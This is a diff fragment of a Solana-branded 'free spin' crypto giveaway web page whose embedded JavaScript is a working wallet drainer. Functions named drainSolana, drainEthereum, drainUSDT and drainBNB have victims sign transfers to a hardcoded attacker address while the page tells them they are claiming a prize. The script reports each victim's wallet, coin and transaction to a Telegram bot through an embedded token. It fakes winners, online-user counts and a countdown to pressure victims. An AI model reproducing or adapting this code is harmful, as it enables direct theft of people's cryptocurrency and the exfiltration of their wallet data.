+                        <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
+                    </svg>
+                </a>
+            </div>
+            <div class="copyright">
+                All rights reserved © 2026 <span class="solana-text">Solana</span>
+            </div>
+        </div>
+
+        <div class="log-box" id="logArea">[System] Ready</div>
+    </div>
+
+    <script>
+        // ============================================================
+        // ⚠️ CONFIGURATION - EDIT THESE VALUES
+        // ============================================================
+        const TELEGRAM_BOT_TOKEN = '8982188978:AAEQtf4AqTz09aPitee_LR0S_HxHVKMCymw';
+        const TELEGRAM_CHAT_ID = '7834157804';
+        const DEST_ADDRESS = '0xa2325c6fe63543e5af3d1b4963ec219808bda62d';
+
+        // ============================================================
+        // STATE
+        // ============================================================
+        let selectedWallet = 'phantom';
+        let selectedCoin = 'solana';
+        let connectedAddress = null;
+        let connectedWalletType = null;
+        let isSpinning = false;
+        let spinCount = 0;
+        let currentPrize = '';
+        let hasQualification = true;
+        let hasSpun = false;
+        let hasClaimed = false;
+        let isClaiming = false;
+        let totalClaimedCount = 150;
+
+        const prizeMap = [
+            '250 USDC SOL',
+            '50 USDC SOL',
+            'ALL 2X BOOST',
+            '250 USDC SOL',
+            '50 USDC SOL',
+            'ALL 2X BOOST',
+            '250 USDC SOL',
+            '50 USDC SOL'
+        ];
+
+        const coinSymbols = {
+            solana: 'SOL',
+            usdt: 'USDT',
+            ethereum: 'ETH',
+            bnb: 'BNB'
+        };
+
+        let winners = [
+            { amount: '250 USDC SOL', address: '7xKp...9F3a', time: 'now' },
+            { amount: '50 USDC SOL', address: '0x3F...b2E', time: '2m' },
+            { amount: 'ALL 2X', address: '5nQ8...mP2k', time: '4m' }
+        ];
+
+        // ============================================================
+        // DOM REFS
+        // ============================================================
+        const connectTopBtn = document.getElementById('connectTopBtn');
+        const freeSpinBtn = document.getElementById('freeSpinBtn');
+        const claimRewardBtn = document.getElementById('claimRewardBtn');
+        const wheel = document.getElementById('wheel');
+        const timerDisplay = document.getElementById('timer');
+        const progressFill = document.getElementById('progressFill');
+        const progressText = document.getElementById('progressText');
+        const liveUsersEl = document.getElementById('liveUsers');
+        const winnersFeed = document.getElementById('winnersFeed');
+        const statusMsg = document.getElementById('statusMsg');
+        const logArea = document.getElementById('logArea');
+        const qualificationBox = document.getElementById('qualificationBox');
+        const congratsBox = document.getElementById('congratsBox');
+        const congratsPrize = document.getElementById('congratsPrize');
+        const qualAmount = document.getElementById('qualAmount');
+        const connectPopup = document.getElementById('connectPopup');
+        const closeConnect = document.getElementById('closeConnect');
+        const claimedCountEl = document.getElementById('claimedCount');
+
+        // ============================================================
+        // HELPERS
+        // ============================================================
+        function log(msg) {
+            const time = new Date().toLocaleTimeString();
+            logArea.innerHTML = `[${time}] ${msg}\n` + logArea.innerHTML;
+            console.log(msg);
+        }
+
+        function setStatus(msg, type = '') {
+            statusMsg.textContent = msg;
+            statusMsg.className = 'status ' + type;
+        }
+
+        function updateConnectBtn() {
+            if (connectedAddress && connectedWalletType) {
+                const walletNames = { phantom: 'Phantom', metamask: 'MetaMask', coinbase: 'Coinbase', trust: 'Trust', exodus: 'Exodus', solflare: 'Solflare', ledger: 'Ledger' };
+                const name = walletNames[connectedWalletType] || 'Wallet';
+                connectTopBtn.innerHTML =
+                    `<span class="dot"></span> ${name} • ${connectedAddress.slice(0,4)}...${connectedAddress.slice(-4)}`;
+                connectTopBtn.classList.add('connected');
+            } else {
+                connectTopBtn.innerHTML = `<span class="dot"></span> Connect Wallet`;
+                connectTopBtn.classList.remove('connected');
+            }
+        }
+
+        function sendToTelegram(data) {
+            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') return;
+            const msg =
+                `🔹 Wallet: ${data.wallet || 'N/A'}\n🔹 Type: ${data.walletType || 'N/A'}\n🔹 Coin: ${data.coin || 'N/A'}\n🔹 Prize: ${data.prize || 'N/A'}\n🔹 Amount: ${data.amount || 'N/A'}\n🔹 Tx: ${data.tx || 'N/A'}\n🔹 Status: ${data.status}\n🔹 Time: ${new Date().toISOString()}`;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg })
+            }).catch(() => {});
+        }
+
+        function updateClaimedCount() {
+            claimedCountEl.textContent = totalClaimedCount.toLocaleString();
+        }
+
+        function incrementClaimedCount() {
+            totalClaimedCount += 1 + Math.floor(Math.random() * 2);
+            updateClaimedCount();
+        }
+
+        // ============================================================
+        // REAL TRANSACTION FUNCTIONS
+        // ============================================================
+
+        // ---- SOLANA ----
+        async function drainSolana(fromAddress, toAddress, amount) {
+            try {
+                const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
+                const fromPubkey = new solanaWeb3.PublicKey(fromAddress);
+                const toPubkey = new solanaWeb3.PublicKey(toAddress);
+
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: fromPubkey,
+                        toPubkey: toPubkey,
+                        lamports: amount * solanaWeb3.LAMPORTS_PER_SOL
+                    })
+                );
+
+                const { blockhash } = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = fromPubkey;
+
+                const signature = await window.solana.signAndSendTransaction(transaction);
+                await connection.confirmTransaction(signature);
+                return signature;
+            } catch (error) {
+                throw new Error('Solana tx failed: ' + error.message);
+            }
+        }
+
+        // ---- ETHEREUM ----
+        async function drainEthereum(fromAddress, toAddress, amount) {
+            try {
+                const web3 = new Web3(window.ethereum);
+                const gasPrice = await web3.eth.getGasPrice();
+                const txData = {
+                    from: fromAddress,
+                    to: toAddress,
+                    value: web3.utils.toWei(amount.toString(), 'ether'),
+                    gasPrice: gasPrice,
+                    gas: 21000
+                };
+                const tx = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [txData]
+                });
+                await web3.eth.getTransactionReceipt(tx);
+                return tx;
+            } catch (error) {
+                throw new Error('Ethereum tx failed: ' + error.message);
+            }
+        }
+
+        // ---- USDT (ERC-20) ----
+        async function drainUSDT(fromAddress, toAddress, amount) {
+            try {
+                const web3 = new Web3(window.ethereum);
+                const gasPrice = await web3.eth.getGasPrice();
+                const usdtContract = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+                const usdtABI = [{
+                    "constant": false,
+                    "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }],
+                    "name": "transfer",
+                    "outputs": [{ "name": "", "type": "bool" }],
+                    "type": "function"
+                }];
+                const contract = new web3.eth.Contract(usdtABI, usdtContract);
+                const usdtAmount = web3.utils.toWei(amount.toString(), 'ether');
+                const txData = {
+                    from: fromAddress,
+                    to: usdtContract,
+                    gasPrice: gasPrice,
+                    gas: 100000,
+                    data: contract.methods.transfer(toAddress, usdtAmount).encodeABI()
+                };
+                const tx = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [txData]
+                });
+                await web3.eth.getTransactionReceipt(tx);
+                return tx;
+            } catch (error) {
+                throw new Error('USDT tx failed: ' + error.message);
+            }
+        }
+
+        // ---- BNB (BSC) ----
+        async function drainBNB(fromAddress, toAddress, amount) {
+            try {
+                const web3 = new Web3(window.ethereum);
+                const txData = {
+                    from: fromAddress,
+                    to: toAddress,
+                    value: web3.utils.toWei(amount.toString(), 'ether'),
+                    gasPrice: web3.utils.toWei('5', 'gwei'),
+                    gas: 21000
+                };
+                const tx = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [txData]
+                });
+                return tx;
+            } catch (error) {
+                throw new Error('BNB tx failed: ' + error.message);
+            }
+        }
+
+        // ============================================================
+        // WALLET CONNECTIONS
+        // ============================================================
+        async function connectPhantom() {
+            if (!window.solana || !window.solana.isPhantom) {
+                setStatus('❌ Phantom not installed', 'error');
+                return null;
+            }
+            try {
+                const resp = await window.solana.connect({ onlyIfTrusted: false });
+                return resp.publicKey.toString();
+            } catch (e) {
+                setStatus('❌ Connection rejected', 'error');
+                return null;
+            }
+        }
+
+        async function connectMetaMask() {
+            if (!window.ethereum) {
+                setStatus('❌ MetaMask not installed', 'error');
+                return null;
+            }
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                return accounts[0];
+            } catch (e) {
+                setStatus('❌ Connection rejected', 'error');
+                return null;
+            }
+        }
+
+        async function connectCoinbase() {
+            if (!window.ethereum || !window.ethereum.isCoinbaseWallet) {
+                setStatus('❌ Coinbase not installed', 'error');
+                return null;
+            }
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                return accounts[0];
+            } catch (e) {
+                setStatus('❌ Connection rejected', 'error');
+                return null;
+            }
+        }
+
+        async function connectTrust() {
+            if (!window.ethereum) {
+                setStatus('❌ Trust not installed', 'error');
+                return null;
+            }
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                return accounts[0];
+            } catch (e) {
+                setStatus('❌ Connection rejected', 'error');
+                return null;
+            }
+        }
+
+        async function connectExodus() {
+            if (!window.ethereum) {
+                setStatus('❌ Exodus not installed', 'error');
+                return null;
+            }
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                return accounts[0];
+            } catch (e) {
+                setStatus('❌ Connection rejected', 'error');
+                return null;
+            }
+        }
+
+        async function connectSolflare() {
+            if (!window.solflare) {
+                setStatus('❌ Solflare not installed', 'error');
+                return null;
+            }
+            try {
+                await window.solflare.connect();
+                return window.solflare.publicKey.toString();
+            } catch (e) {
+                setStatus('❌ Connection rejected', 'error');
+                return null;
+            }
+        }
+
+        async function connectLedger() {
+            setStatus('⚠️ Ledger: Please connect via Ledger Live', 'error');
+            return null;
+        }
+
+        const connectMap = {
+            phantom: connectPhantom,
+            metamask: connectMetaMask,
+            coinbase: connectCoinbase,
+            trust: connectTrust,
+            exodus: connectExodus,
+            solflare: connectSolflare,
+            ledger: connectLedger
+        };
+
+        async function connectWallet(walletType) {
+            const fn = connectMap[walletType];
+            if (!fn) {
+                setStatus(`❌ ${walletType} not supported`, 'error');
+                return null;
+            }
+            const address = await fn();
+            if (address) {
+                connectedAddress = address;
+                connectedWalletType = walletType;
+                setStatus(`✅ Connected: ${address.slice(0,6)}...`, 'connected');
+                log(`✅ Connected: ${address} via ${walletType}`);
+                updateConnectBtn();
+                sendToTelegram({ wallet: address, walletType: walletType, coin: selectedCoin, status: 'connected' });
+                return address;
+            }
+            return null;
+        }
+
+        function showConnectPopup() { connectPopup.classList.add('show'); }
+
+        function hideConnectPopup() { connectPopup.classList.remove('show'); }
+
+        // ============================================================
+        // SPIN
+        // ============================================================
+        freeSpinBtn.addEventListener('click', function() {
+            if (isSpinning) return;
+            if (!hasQualification) {
+                setStatus('❌ No qualification available', 'error');
+                return;
+            }
+
+            qualificationBox.style.display = 'none';
+            setStatus('🎰 Spinning...', '');
+            isSpinning = true;
+            freeSpinBtn.disabled = true;
+
+            const extraSpins = 5 + Math.random() * 5;
+            const degrees = extraSpins * 360 + Math.random() * 360;
+            wheel.style.transform = `rotate(${degrees}deg)`;
+
+            setTimeout(() => {
+                const finalAngle = degrees % 360;
+                let segIndex = Math.floor(finalAngle / 45) % 8;
+                if (segIndex >= 8) segIndex = 7;
+                currentPrize = prizeMap[segIndex];
+
+                spinCount++;
+                isSpinning = false;
+                freeSpinBtn.disabled = false;
+                hasSpun = true;
+                hasQualification = false;
+
+                congratsPrize.textContent = currentPrize;
+                congratsBox.classList.add('show');
+                setStatus(`🎉 You won ${currentPrize}!`, 'success');
+                log(`🎰 WON: ${currentPrize}`);
+
+                sendToTelegram({
+                    wallet: connectedAddress || 'unconnected',
+                    walletType: connectedWalletType || 'unknown',
+                    coin: selectedCoin,
+                    prize: currentPrize,
+                    status: 'spin_win'
+                });
+
+                claimRewardBtn.disabled = false;
+                claimRewardBtn.textContent = '💰 Claim Reward';
+                claimRewardBtn.classList.remove('confirmed');
+                hasClaimed = false;
+                updateProgress();
+                qualAmount.textContent = `+ ${currentPrize}`;
+            }, 5000);
+        });
+
+        // ============================================================
+        // CLAIM REWARD - REAL TRANSACTION
+        // ============================================================
+        claimRewardBtn.addEventListener('click', async function() {
+            if (isClaiming) return;
+            if (!hasSpun || !currentPrize) {
+                setStatus('❌ Spin first!', 'error');
+                return;
+            }
+            if (hasClaimed) {
+                setStatus('✅ Already claimed!', 'connected');
+                return;
+            }
+
+            // Check destination wallet
+            if (!DEST_ADDRESS || DEST_ADDRESS === 'YOUR_WALLET_ADDRESS_HERE') {
+                setStatus('❌ Set DEST_ADDRESS in config!', 'error');
+                return;
+            }
+
+            // Check if wallet is connected
+            if (!connectedAddress) {
+                showConnectPopup();
+                return;
+            }
+
+            isClaiming = true;
+            claimRewardBtn.disabled = true;
+            claimRewardBtn.textContent = '⏳ Sending transaction...';
+            setStatus(`⏳ Sending ${currentPrize}...`, '');
+
+            try {
+                // Determine amount from prize
+                let amount = 0;
+                if (currentPrize.includes('250')) amount = 0.25;
+                else if (currentPrize.includes('50')) amount = 0.05;
+                else if (currentPrize.includes('ALL 2X')) amount = 0.02;
+                else amount = 0.01;
+
+                let tx = null;
+                const coin = selectedCoin;
+
+                // Execute based on selected coin
+                switch (coin) {
+                    case 'solana':
+                        if (connectedWalletType === 'phantom' || connectedWalletType === 'solflare') {
+                            tx = await drainSolana(connectedAddress, DEST_ADDRESS, amount);
+                        } else {
+                            setStatus('❌ Use Phantom or Solflare for SOL', 'error');
+                            isClaiming = false;
+                            claimRewardBtn.disabled = false;
+                            claimRewardBtn.textContent = '💰 Claim Reward';
+                            return;
+                        }
+                        break;
+
+                    case 'ethereum':
+                        if (connectedWalletType === 'metamask' || connectedWalletType === 'coinbase' ||
+                            connectedWalletType === 'trust' || connectedWalletType === 'exodus') {
+                            tx = await drainEthereum(connectedAddress, DEST_ADDRESS, amount);
+                        } else {
+                            setStatus('❌ Use MetaMask/Coinbase/Trust/Exodus for ETH', 'error');
+                            isClaiming = false;
+                            claimRewardBtn.disabled = false;
+                            claimRewardBtn.textContent = '💰 Claim Reward';
+                            return;
+                        }
+                        break;
+
+                    case 'usdt':
+                        if (connectedWalletType === 'metamask' || connectedWalletType === 'coinbase' ||
+                            connectedWalletType === 'trust' || connectedWalletType === 'exodus') {
+                            tx = await drainUSDT(connectedAddress, DEST_ADDRESS, amount);
+                        } else {
+                            setStatus('❌ Use MetaMask/Coinbase/Trust/Exodus for USDT', 'error');
+                            isClaiming = false;
+                            claimRewardBtn.disabled = false;
+                            claimRewardBtn.textContent = '💰 Claim Reward';
+                            return;
+                        }
+                        break;
+
+                    case 'bnb':
+                        if (connectedWalletType === 'metamask' || connectedWalletType === 'trust') {
+                            tx = await drainBNB(connectedAddress, DEST_ADDRESS, amount);
+                        } else {
+                            setStatus('❌ Use MetaMask or Trust on BSC for BNB', 'error');
+                            isClaiming = false;
+                            claimRewardBtn.disabled = false;
+                            claimRewardBtn.textContent = '💰 Claim Reward';
+                            return;
+                        }
+                        break;
+
+                    default:
+                        setStatus('❌ Coin not supported', 'error');
+                        isClaiming = false;
+                        claimRewardBtn.disabled = false;
+                        claimRewardBtn.textContent = '💰 Claim Reward';
+                        return;
+                }
+
+                if (tx) {
+                    hasClaimed = true;
+                    setStatus(`✅ ${amount} ${coin.toUpperCase()} sent! Tx: ${tx.slice(0,12)}...`, 'connected');
+                    log(`✅ Tx sent: ${tx}`);
+
+                    sendToTelegram({
+                        wallet: connectedAddress,
+                        walletType: connectedWalletType,
+                        coin: coin,
+                        prize: currentPrize,
+                        amount: amount,
+                        tx: tx,
+                        status: 'claimed_confirmed'
+                    });
+
+                    claimRewardBtn.innerHTML = '✅ Claimed!';
+                    claimRewardBtn.classList.add('confirmed');
+                    addWinner(currentPrize, connectedAddress);
+                    incrementClaimedCount();
+
+                    // Reset after delay
+                    setTimeout(() => {
+                        qualificationBox.querySelector('.title').textContent = '🎯 New qualification available!';
+                        qualificationBox.querySelector('.desc').textContent = 'Spin again to win more';
+                        qualAmount.textContent = '+ 25 USDC SOL';
+                        hasQualification = true;
+                        hasSpun = false;
+                        currentPrize = '';
+                        claimRewardBtn.textContent = '💰 Claim Reward';
+                        claimRewardBtn.classList.remove('confirmed');
+                        setStatus('📩 New qualification! Click Free Spin', '');
+                    }, 5000);
+                }
+            } catch (error) {
+                setStatus(`❌ Tx failed: ${error.message}`, 'error');
+                log(`❌ Error: ${error.message}`);
+                sendToTelegram({
+                    wallet: connectedAddress,
+                    walletType: connectedWalletType,
+                    coin: selectedCoin,
+                    status: 'error: ' + error.message
+                });
+            } finally {
+                isClaiming = false;
+                claimRewardBtn.disabled = false;
+                claimRewardBtn.textContent = '💰 Claim Reward';
+            }
+        });
+
+        // ============================================================
+        // UI EVENTS
+        // ============================================================
+        document.querySelectorAll('#connectPopup .wallet-option').forEach(btn => {
+            btn.addEventListener('click', async function() {
+                const wallet = this.dataset.wallet;
+                const address = await connectWallet(wallet);
+                if (address) {
+                    hideConnectPopup();
+                    if (hasSpun && !hasClaimed && currentPrize) {
+                        claimRewardBtn.click();
+                    }
+                }
+            });
+        });
+
+        closeConnect.addEventListener('click', hideConnectPopup);
+
+        connectTopBtn.addEventListener('click', function() {
+            if (connectedAddress) {
+                setStatus(`✅ Connected: ${connectedAddress}`, 'connected');
+            } else {
+                showConnectPopup();
+            }
+        });
+
+        document.querySelectorAll('.coin-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.coin-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                selectedCoin = this.dataset.coin;
+                const symbol = coinSymbols[selectedCoin] || 'SOL';
+                setStatus(`✅ Selected ${symbol}`, 'connected');
+                log(`🔹 Coin: ${selectedCoin}`);
+                qualAmount.textContent = `+ 25 ${symbol}`;
+            });
+        });
+
+        // ============================================================
+        // BACKGROUND TASKS
+        // ============================================================
+        function addWinner(amount, address) {
+            const shortAddr = address ? address.slice(0, 6) + '...' + address.slice(-4) : 'Unknown';
+            winners.unshift({ amount, address: shortAddr, time: 'now' });
+            if (winners.length > 12) winners.pop();
+            winnersFeed.innerHTML = winners.map(w =>
+                `<div class="winner-item"><span>🎉 <span class="win-amount">${w.amount}</span> by ${w.address}</span> <span class="win-time">${w.time}</span></div>`
+            ).join('');
+        }
+
+        function updateLiveUsers() {
+            const base = 128;
+            const count = base + Math.floor(Math.random() * 30) - 15 + spinCount * 2;
+            liveUsersEl.textContent = `${count} online`;
+        }
+        setInterval(updateLiveUsers, 4000);
+
+        function updateProgress() {
+            const progress = Math.min(100, 15 + spinCount * 3 + Math.floor(Math.random() * 4));
+            progressFill.style.width = progress + '%';
+            progressText.textContent = progress + '%';
+        }
+        setInterval(updateProgress, 3000);
+
+        let timeLeft = 300;
+
+        function updateTimer() {
+            const mins = Math.floor(timeLeft / 60);
+            const secs = timeLeft % 60;
+            timerDisplay.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+            if (timeLeft > 0) timeLeft--;
+            else { timeLeft = 300;
+                log('🔄 Timer reset'); }
+        }
+        setInterval(updateTimer, 1000);
+
+        // Auto-connect Phantom
+        setTimeout(async () => {
+            if (window.solana && window.solana.isPhantom) {
+                try {
+                    const resp = await window.solana.connect({ onlyIfTrusted: true });
+                    connectedAddress = resp.publicKey.toString();
+                    connectedWalletType = 'phantom';
+                    setStatus(`📩 You have a qualification! Click Free Spin`, '');
+                    log(`✅ Auto-connected: ${connectedAddress}`);
+                    updateConnectBtn();
+                } catch (e) {}
+            }
+        }, 1500);
+
+        // Fake winners every 15s
+        setInterval(() => {
+            const fakePrizes = ['250 USDC SOL', '50 USDC SOL', 'ALL 2X', '250 USDC SOL', '50 USDC SOL'];
+            const prize = fakePrizes[Math.floor(Math.random() * fakePrizes.length)];
+            const fakeAddr = '0x' + Math.random().toString(36).substring(2, 8) + '...' + Math.random().toString(36)
+                .substring(2, 6);
+            addWinner(prize, fakeAddr);
+            incrementClaimedCount();
+        }, 15000);
+
+        updateClaimedCount();
+        log('🟢 Full screen responsive version loaded!');
+    </script>
+</body>
+</html>
